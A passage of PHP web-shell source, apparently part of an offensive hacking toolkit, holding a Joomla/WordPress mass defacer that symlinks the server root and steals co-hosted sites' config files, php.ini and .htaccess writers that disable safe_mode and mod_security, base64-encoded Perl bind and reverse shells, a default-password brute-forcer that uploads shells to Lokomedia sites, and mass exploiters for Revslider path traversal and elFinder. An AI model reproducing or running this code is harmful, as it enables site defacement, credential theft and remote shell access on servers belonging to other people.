{$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co); $buffer = curl_exec($ch);$hidden2=entre2v2($buffer ,'<input type="hidden" name="','" value="1"',6);if($hidden2) {$output.= "[+] index.php file founded in Theme Editor<br />";} else {$output.= "[-] index.php Not found in Theme Editor<br />";}}if($hidden2) {$url2=$site_url."/index.php?option=com_templates&layout=edit";curl_setopt($ch, CURLOPT_URL, $url2);curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$content."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_USERAGENT, $useragent);curl_setopt($ch, CURLOPT_COOKIEJAR, $co); curl_setopt($ch, CURLOPT_COOKIEFILE, $co);$buffer = curl_exec($ch);curl_close($ch);$pos = strpos($buffer,'<dd class="message message fade">');$cond = 0;if($pos === false) {$output.= "[-] Updating Index.php Error<br />";} else {$output.= "[+] Index.php Template successfully saved<br />";$cond = 1;}}}} else {$output.= "[-] DB Error<br />";}global $base_path;unlink($base_path.$co);return array('cond'=>$cond, 'output'=>$output); }function exec_mode_1($def_url) {@mkdir('sym',0777);$wr  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";$fp = @fopen ('sym/.htaccess','w');fwrite($fp, $wr);@symlink('/','sym/root');$dominios = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);$out[1] = array_unique($out[1]);$numero_dominios = count($out[1]);echo "Total domains: $numero_dominios <br><br />";$def = file_get_contents($def_url);$def = urlencode($def);$dd = 'PD9waHANCiRkZWYgPSBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3pvbmVobWlycm9ycy5vcmcvZGVmYWNlZC8yMDEzLzAzLzE5L2Fzc29jaWFwcmVzcy5uZXQnKTsNCiRwID0gZXhwbG9kZSgncHVibGljX2h0bWwnLGRpcm5hbWUoX19GSUxFX18pKTsNCiRwID0gJHBbMF0uJ3B1YmxpY19odG1sJzsNCmlmICgkaGFuZGxlID0gb3BlbmRpcigkcCkpIHsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXguaHRtbCcsJ3crJyk7DQogICAgQGZ3cml0ZSgkZnAxLCAkZGVmKTsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXgucGhwJywndysnKTsNCiAgICBAZndyaXRlKCRmcDEsICRkZWYpOw0KICAgICRmcDEgPSBAZm9wZW4oJHAuJy9pbmRleC5odG0nLCd3KycpOw0KICAgIEBmd3JpdGUoJGZwMSwgJGRlZik7DQogICAgZWNobyAnRG9uZSc7DQp9DQpjbG9zZWRpcigkaGFuZGxlKTsNCnVubGluayhfX0ZJTEVfXyk7DQo/Pg==';$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/sym/root/home/';$output = fopen('defaced.html', 'a+');$_SESSION['count1'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count1']) ? $_SESSION['count1'] :0 ) : 0;$_SESSION['count2'] = (isset($_GET['st']) && $_GET['st']!='') ? (isset($_SESSION['count2']) ? $_SESSION['count2'] :0 ) : 0;echo '<table style="width:75%;" align="center"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$st = (isset($_GET['st']) && $_GET['st']!='') ? $_GET['st'] : 0;for($i = $st; $i <= $numero_dominios; $i++){$domain = $out[1][$i];$dono_arquivo = @fileowner("/etc/valiases/".$domain);$infos = @posix_getpwuid($dono_arquivo);if($infos['name']!='root') {$config01 = @file_get_contents($base_url.$infos['name']."/public_html/configuration.php");$config02 = @file_get_contents($base_url.$infos['name']."/public_html/wp-config.php");$config03 = @file_get_contents($base_url.$infos['name']."/public_html/blog/wp-config.php");$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count1'] = $_SESSION['count1'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config03 && preg_match('/DB_NAME/i',$config03)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config03, $dd);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$_SESSION['count2'] = $_SESSION['count2'] + 1;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($_SESSION['count1']+$_SESSION['count2']).' (JOOMLA = '.$_SESSION['count1'].', WORDPRESS = '.$_SESSION['count2'].')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($_SESSION['count1']+$_SESSION['count2'] > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_2($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);$output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHdkfTs
   NCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2
   h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19od
   G1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwv
   YmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRklMRSwgJy9ldGMvcGFzc3d
   kJyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPCR5OyRrYSsrKXsNCiAgIC
   B3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i = 1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.$i++.'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}function exec_mode_3($def_url) {$domains = @file_get_contents("/etc/named.conf");@preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);$out = array_unique($out[1]);$num = count($out);print("Total domains: $num<br><br />");$def = file_get_contents($def_url);$def = urlencode($def);  $output = fopen('defaced.html', 'a+');$defaced = '';$count1 = 0;$count2 = 0;echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';$j = 1;$map = array();foreach($out as $d) {$info = @posix_getpwuid(fileowner("/etc/valiases/".$d));$map[$info['name']] = $d;}$dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHd
   kfTsNCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcH
   VibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL
   3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicv
   cHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRkl
   MRSwgJ2RhdGEudHh0Jyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPC
   R5OyRrYSsrKXsNCiAgICB3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';mkdir('plsym',0777);file_put_contents('plsym/data.txt', $_POST['man_data']);file_put_contents('plsym/plsym.cc', base64_decode($dt));chmod('plsym/plsym.cc', 0755);$wr  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";$fp = @fopen ('plsym/.htaccess','w');fwrite($fp, $wr);fclose($fp);$res = file_get_contents('http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/plsym.cc');  $url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']).'/plsym/';unlink('plsym/plsym.cc');$data = file_get_contents($url);preg_match_all('/<a href="(.+)">/', $data, $match);unset($match[1][0]);$i=1;foreach($match[1] as $m){$mz = explode('##',urldecode($m));$config01 = '';$config02 = '';if($mz[1] == 'joomla.txt') {$config01 = file_get_contents($url.$m);}if($mz[1] == 'wordpress.txt') {$config02 = file_get_contents($url.$m);}$domain = $map[$mz[0]];$cls = ($j % 2 == 0) ? 'class="even"' : 'class="odd"';if($config01 && preg_match('/dbprefix/i',$config01)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td align="center">'.($i++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="pink">JOOMLA</font></td>';$res = index_changer_joomla($config01, $def, $domain);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count1++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}if($config02 && preg_match('/DB_NAME/i',$config02)){echo '<tr '.$cls.'><td align="center">'.($j++).'</td><td><a href="http://'.$domain.'" target="blank">'.$domain.'</a></td>';echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';$res = index_changer_wp($config02, $def);echo '<td>'.$res['output'].'</td>';if($res['cond']) {echo '<td align="center"><span class="green">DEFACED</span></td>';fwrite($output, 'http://'.$domain."<br>");$count2++;} else {echo '<td align="center"><span class="red">FAILED</span></td>';}echo '</tr>';}}echo '</table>';echo '<hr/>';echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';if($count1+$count2 > 0){echo '<a href="'.$_SERVER['PHP_SELF'].'?pass='.$_GET['pass'].'&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';}}echo '<!DOCTYPE html><html><head><link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css"><style type="text/css">.header {position:fixed;width:100%;top:0;background:#000;}.footer {position:fixed;width:100%;bottom:0;background:#000;}input[type="radio"]{margin-top: 0;}.td2 {border-left:1px solid red;border-radius: 2px 2px 2px 2px;}.even {background-color: rgba(25, 25, 25, 0.6);}.odd {background-color: rgba(102, 102, 102, 0.6);}textarea{background: rgba(0,0,0,0.6); color: white;}.green {color:#00FF00;font-weight:bold;}.red {color:#FF0000;font-weight:bold;}</style><script type="text/javascript">function change() {if(document.getElementById(\'rcd\').checked == true) {document.getElementById(\'tra\').style.display = \'\';} else {document.getElementById(\'tra\').style.display = \'none\';}}function hide() {document.getElementById(\'tra\').style.display = \'none\';}</script></head><body><h2 style="font-size:25px;color:#00ff00;text-align: center;font-family:orbitron;text-shadow: 6px 6px 6px black;">Wordpress and Joomla Mass Defacer</h2>';if(!isset($_POST['form_action']) && !isset($_GET['mode'])){echo '<form action="" method="post"><table align=center><tr><td><input type="radio" value="1" name="mode" checked="checked" onclick="hide();"></td><td>using /etc/named.conf ('.(is_readable('/etc/named.conf')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" onclick="hide();"></td><td>using /etc/passwd ('.(is_readable('/etc/passwd')?'<span class="green">READABLE</span>':'<span class="red">NOT READABLE</span>').')</td></tr><tr><td><input type="radio" value="2" name="mode" id="rcd" onclick="change();"></td><td>manual copy of /etc/passwd</td></tr><tr id="tra" style="display: none;"><td></td><td><textarea cols="60" rows="10" name="man_data"></textarea></td></tr></table><br><input type="hidden" name="form_action" value="1"><table align=center><tr><td><b>index url: </b><input class="inputz" size="45" type="text" name="defpage" value=""></tr></td></table><center><input class="inputzbut" type="submit" value="Attack !" name="Submit"></center></form>';}$milaf_el_index = $_POST['defpage'];if($_POST['form_action'] == 1) {if($_POST['mode']==1) { exec_mode_1($milaf_el_index); }if($_POST['mode']==2) { exec_mode_2($milaf_el_index); }if($_POST['mode']==3) { exec_mode_3($milaf_el_index); }}if($_GET['mode']==1) { exec_mode_1($milaf_el_index); }echo '</body></html>';
   }
} elseif($_GET['do'] == 'bypass'){
		echo "<center>";
		echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /></form>";
		if(isset($_POST['ini']))
{
		$file = fopen("php.ini","w");
		echo fwrite($file,"disable_functions=none
safe_mode = Off
	");
		fclose($file);
		echo "<a href='php.ini'>click here!</a>";
}		if(isset($_POST['htce']))
{
		$file = fopen(".htaccess","w");
		echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
	");
		fclose($file);
		echo "htaccess successfully created!";
}
		echo"</center>";
}
 elseif($_GET['do'] == 'backconnect') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
} elseif($_GET['do'] == 'kill') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
		else
			echo '<center>unlink failed!</center>';
} elseif($_GET['do'] == 'domains'){echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";$d0mains = @file("/etc/named.conf");if(!$d0mains){die("<center>Error : can't read [ /etc/named.conf ]</center>");}echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
}
 elseif($_GET['do'] == 'lokomedia') {
	function cek($url) {
	$ch = curl_init($url);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	$res = curl_exec($ch);
		  curl_close($ch);
	return $res;
}
function curl($url,$payload) {
	$ch = curl_init($url);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	$res = curl_exec($ch);
		  curl_close($ch);
	return $res;
}
	echo "<center>
	<h1>&#x4c;&#x6f;&#x6b;&#x6f;&#x6d;&#x65;&#x64;&#x69;&#x61;&#x20;&#x41;&#x75;&#x74;&#x6f;&#x20;&#x54;&#x61;&#x6e;&#x61;&#x6d;&#x20;&#x53;&#x68;&#x65;&#x6c;&#x6c;</h1>
	<form method='post'>
	Domain: <br>
	<textarea placeholder='&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x74;&#x61;&#x72;&#x67;&#x65;&#x74;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;' name='url' style='width: 500px; height: 250px;'></textarea><br>
	<input type='submit' name='hajar' value='GassPoll'>
	</form>";
if($_POST['hajar']) {
	$domain = explode("\r\n", $_POST['url']);
	$up = array(
		"admin" => "admin",
		"admin" => "123456",
		"xai" => "xaixploit",
		"admin" => "admin12345",
		"admin" => "admin123",
		"direktur" => "admin",
		);
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			$data1 = array(
				"username" => $user,
				"password" => $pass,
				);
			$login = curl($url."/adminweb/cek_login.php", $data1);
			if(preg_match("/Logout|Administrator/", $login)) {
				$file = "shellmu.php"; //1 dir dengan exploiternyaa
				$data2 = array(
					"judul" => "SHENZYY Shell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
				$ngirim = curl($url."/adminweb/modul/mod_download/aksi_download.php?module=download&act=input",$data);
				if(preg_match("/xaixploit auto exploiter lokomedia/i", $ngirim)) {
					echo "[+] $url -> <font color=green>sukses login [ user: $user pass: $pass ]</font><br>";
					$cek = cek("$url/files/image.php");
					if(preg_match("/xaixploit/", $cek)) {
						echo "[+] $url/files/image.php -> <font color=green>shellmu.</font><br><br>";
					} else {
						echo "[-] <font color='#bb0000'>shellmu gaada.</font><br><br>";
					}
				}
			} else {
				echo "[-] $url -> gagal login<br><br>";
			}
		}
	}
}

}



elseif ($_GET['do'] == 'revslider') {
        echo "
<center>        
<center class='mybox'>
<h1>Revslider Mass Exploiter</h1>
<form method='post'>
<textarea class='mybox' name='site' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='kotak' type='submit' style='width: 50px; height: 30px; border-color:white;margin:10px 2px 0 2px;' name='sikat' value='Gass!'>
</form></center></center>
";
        function findit($mytext, $starttag, $endtag) {
            $posLeft = stripos($mytext, $starttag) + strlen($starttag);
            $posRight = stripos($mytext, $endtag, $posLeft + 1);
            return substr($mytext, $posLeft, $posRight - $posLeft);
        }
        error_reporting(0);
        set_time_limit(0);
        $ya = $_POST['sikat'];
        $co = $_POST['site'];
        if ($ya) {
            $e = explode("
", $co);
            foreach ($e as $bda) {
                //echo '<br>'.$bda;
                $linkof = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
                $dn = ($bda) . ($linkof);
                $file = @file_get_contents($dn);
                if (eregi('DB_HOST', $file) and !eregi('FTP_USER', $file)) {
                    echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
                    echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
                    echo "<font face='courier' color=lime >DB name : </font>" . findit($file, "DB_NAME', '", "');") . "<br>";
                    echo "<font face='courier' color=lime >DB user : </font>" . findit($file, "DB_USER', '", "');") . "<br>";
                    echo "<font face='courier' color=lime >DB pass : </font>" . findit($file, "DB_PASSWORD', '", "');") . "<br>";
                    echo "<font face='courier' color=lime >DB host : </font>" . findit($file, "DB_HOST', '", "');") . "<br>";
                } elseif (eregi('DB_HOST', $file) and eregi('FTP_USER', $file)) {
                    echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
                    echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
                    echo "<font face='courier' color=lime >FTP user : </font>" . findit($file, "FTP_USER','", "');") . "<br>";
                    echo "<font face='courier' color=lime >FTP pass : </font>" . findit($file, "FTP_PASS','", "');") . "<br>";
                    echo "<font face='courier' color=lime >FTP host : </font>" . findit($file, "FTP_HOST','", "');") . "<br>";
                } else {
                    echo "<center><font face='courier' color='red' >" . $bda . " ----> not infected </font></center>";
                }
                echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
            }
        }

}
elseif ($_GET['do'] == 'elfinder') {
		echo "<center>";
        echo "<div class='mybox'>";
        echo '<h1>ElFinder Mass Exploiter</h1>';
        echo '<form method="post">
Target: <br>
<textarea name="target" placeholder="http://www.target.com/elFinder/php/connector.php" style="width: 600px; height: 250px; margin: 5px auto; resize:
none;"></textarea><br>
<input type="submit" name="x" style="width: 150px; height: 25px; margin: 5px;" value="SIKAT!">
</form></center>';
        echo "</div>";
        function ngirim($url, $isi) {
            $ch = curl_init("$url");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
